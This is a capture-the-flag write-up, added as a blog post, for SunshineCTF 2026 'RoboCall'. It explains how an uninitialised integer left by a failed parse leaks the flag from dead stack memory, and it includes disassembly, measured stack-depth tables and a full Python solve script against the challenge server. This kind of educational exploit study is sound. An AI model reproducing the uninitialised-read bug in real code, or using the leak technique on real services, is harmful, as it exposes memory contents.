@@ -1,0 +1,211 @@
+---
+title: 'SunshineCTF 2026 - RoboCall'
+description: 'A flag scattered into dead stack as thirteen chunks, read back four bytes at a time through an uninitialised int that a failed parse never writes'
+date: 2026-09-30
+tags: ['writeup', 'reverse-engineering', 'uninitialized-memory', 'information-disclosure', 'sunshinectf', '2026']
+authors: ['kudaliar']
+draft: false
+---
+
+A phone tree that will not let you cancel your subscription. "Let's see how nimbly you navigate this stack" is not flavour text — the flag is written into dead stack memory as thirteen four-byte chunks at thirteen fixed depths, and the only way to read one back is to arrange for a stack frame to land exactly on it.
+
+The read primitive is an integer parser that returns failure **without writing its output parameter**, and a caller that prints that output anyway.
+
+## Challenge Description
+
+> Welcome to robocall! Let's see how nimbly you navigate this stack.
+
+Provided: `robocall`. PIE, and usefully **not stripped** — `nm` gives every function name.
+
+## Initial Analysis
+
+The binary is a menu maze: call the cable company, sit through options, and try to reach cancellation. The symbol table points straight at the interesting part:
+
+```text
+00000000000018ac place_flag
+0000000000001a0d main
+0000000000001aab start_position
+0000000000001c29 initial_call
+0000000000002cb0 cancel_plan
+0000000000001431 raw_parse_int
+00000000000012a9 raw_print_int
+0000000000004020 CHUNK_DEPTH        (.rodata)
+```
+
+`place_flag` is called from `main` before anything else:
+
+```asm
+1a26:  call   18ac <place_flag>
+```
+
+It opens `flag.txt`, reads 60 bytes, zeroes a `0x2000` stack region, then scatters the flag:
+
+```asm
+1979:  lea    rax,[rip+0x269f]         ; CHUNK_DEPTH
+1981:  mov    eax,DWORD PTR [rdx+rax*1]
+1984:  mov    edx,0x19dc
+1989:  sub    edx,eax                  ; 0x19dc - CHUNK_DEPTH[i]
+198e:  lea    rdx,[rbp-0x2020]
+1995:  add    rax,rdx                  ; destination for chunk i
+...
+19d3:  cmp    DWORD PTR [rbp-0x8],0x3  ; four bytes per chunk
+19f1:  cmp    DWORD PTR [rbp-0x4],0xc  ; thirteen chunks
+```
+
+So chunk `i` goes to `rbp - (1604 + CHUNK_DEPTH[i])` — and then the function **returns**, leaving all thirteen as dead stack below the frame.
+
+```text
+CHUNK_DEPTH = 1024 1152 1312 1392 1440 1600 1680 1728 1888 1968 2016 2048 2176
+```
+
+## The Vulnerability
+
+`raw_parse_int` bails out on non-numeric input without ever touching its output parameter:
+
+```asm
+14c6:  cmp    al,0x2f
+14c8:  jle    14de
+14da:  cmp    al,0x39
+14dc:  jle    14e8
+14de:  mov    eax,0x0
+14e3:  jmp    156a                     ; return 0, *out untouched
+```
+
+And in `cancel_plan`, the caller prints that same slot regardless:
+
+```asm
+2f01:  call   1431 <raw_parse_int>
+2f34:  lea    rax,[rip+0x27a3]         ; "You've entered \""
+2f3e:  call   1209 <raw_print>
+2f43:  mov    eax,DWORD PTR [rbp-0x204]   ; uninitialised on a failed parse
+2f4b:  call   12a9 <raw_print_int>
+```
+
+So a non-numeric answer makes the program print four raw bytes of stack as a signed integer. `struct.pack("<i", N)` turns it straight back into a flag chunk.
+
+One catch: all six `raw_parse_int` calls in `cancel_plan` share the same output slot at `[rbp-0x204]`. Answering the first "are you sure?" prompt with a digit initialises it, and the second prompt then prints that digit back:
+
+```text
+Press 1 for no.
+Press 8 for yes.
+8
+Are you not sure?
+x
+You've entered "8", are you sure?      <- stale, not a leak
+```
+
+Give a non-numeric answer to **both** prompts and the slot is never written at all:
+
+```text
+round  1: 125        ->  b'}\x00\x00\x00'
+```
+
+`125` is `}` — the last byte of the flag. That confirms the mechanism.
+
+## Which chunk you get
+
+The leak address is `cancel_plan_rbp - 0x204`. On the shortest route to the cancel prompt that lands exactly on the point where `CHUNK_DEPTH` would be zero, so **the extra stack depth burned before cancelling is the chunk index**.
+
+Depth accumulates because the menu handlers do not return — each one calls `start_position` again, so every detour is permanent for the life of the process.
+
+The step costs have to be **measured**, not computed from frame sizes. The handlers return before recursing, so the arithmetic is not what the `sub rsp` values suggest:
+
+| detour | cost |
+|---|---|
+| scream (menu `3`, then a frustration rating) | 288 |
+| Call, report outage (`1`, `2`) | 1024 |
+| Call, technical support, report outage (`1`, `4`, `1`) | 1392 |
+| invalid menu input | **0** — it re-reads in place, no recursion |
+
+The invalid-input case is the one that looks most promising and does nothing at all: the prompt is not reprinted and no frame is pushed.
+
+Every required depth is then `1024a + 1392b + 288c`:
+
+```text
+  chunk  0  d=1024  ['outage']
+  chunk  1  d=1152  ['scream'] * 4
+  chunk  2  d=1312  ['outage', 'scream']
+  chunk  3  d=1392  ['tech']
+  chunk  4  d=1440  ['scream'] * 5
+  chunk  5  d=1600  ['outage', 'scream', 'scream']
+  chunk  6  d=1680  ['tech', 'scream']
+  chunk  7  d=1728  ['scream'] * 6
+  chunk  8  d=1888  ['outage', 'scream', 'scream', 'scream']
+  chunk  9  d=1968  ['tech', 'scream', 'scream']
+  chunk 10  d=2016  ['scream'] * 7
+  chunk 11  d=2048  ['outage', 'outage']
+  chunk 12  d=2176  ['outage', 'scream', 'scream', 'scream', 'scream']
+```
+
+One process per chunk, thirteen runs, concatenate.
+
+## Speed
+
+Every prompt is padded with a `nanosleep` whose duration comes from the global `be_annoying`, and without dealing with it each run takes minutes. `main` checks the very first line:
+
+```asm
+1a85:  call   1431 <raw_parse_int>
+1a90:  cmp    eax,0x2a                 ; 42
+1a93:  jne    1a9f
+1a95:  mov    DWORD PTR [rip+0x5a91],0x0   ; be_annoying = 0
+```
+
+Entering **`42`** at "Press enter to start" removes every delay.
+
+## Solve Script
+
+```python
+import struct, re
+
+# measured, not derived from frame sizes: the handlers return before recursing
+SIZE = {"scream": 288, "outage": 1024, "tech": 1392}
+CD = [1024, 1152, 1312, 1392, 1440, 1600, 1680, 1728, 1888, 1968, 2016, 2048, 2176]
+
+def plan_for(depth):
+    for base, n in (("tech", 1), ("outage", 2), ("outage", 1), (None, 0)):
+        rem = depth - (SIZE[base] * n if base else 0)
+        if rem >= 0 and rem % 288 == 0:
+            return ([base] * n if base else []) + ["scream"] * (rem // 288)
+
+def step(t, kind):
+    if kind == "scream":
+        t.send("3\n"); t.until("how frustrated are you?")
+        t.send("7\n"); t.until("3. Scream")
+    else:
+        t.send("1\n"); t.until("press 7.")
+        t.send({"outage": "2\n", "tech": "4\n"}[kind])
+        if kind == "tech":
+            t.until("equipment replaced press 2."); t.send("1\n")
+        t.until("report the outage address:"); t.send("nowhere\n")
+        t.until("3. Scream")
+
+def leak(t):
+    t.send("1\n");            t.until("press 7.")
+    t.send("6\n");            t.until("operator press 3.")
+    t.send("2\n");            t.until("phone number associated")
+    t.send("5551234567\n");   t.until("address we have on file.")
+    t.send("123 Moon St\n");  t.until("name of your first pet.")
+    t.send("Rex\n");          t.until("Press 8 for yes.")
+    t.send("x\n");            t.until("Press 8 for yes.")   # both prompts
+    t.send("x\n")                                           # must be non-numeric
+    out = CLEAN(t.until('", are you sure?'))
+    return int(re.search(rb'You\'ve entered "(-?\d+)"', out).group(1))
+
+def run(target, steps):
+    t = Tube(target)
+    t.until("Press enter to start."); t.send("42\n")   # be_annoying = 0
+    t.until("3. Scream")
+    for k in steps:
+        step(t, k)
+    return leak(t)
+
+flag = b"".join(struct.pack("<i", run(("sunshinectf.games", 26199), plan_for(d)))
+                for d in CD)
+print(flag.decode())
+```
+
+## Flag
+
+```text
+sun{you_must_be_some_sort_of_nimble_space_navigator}
+```
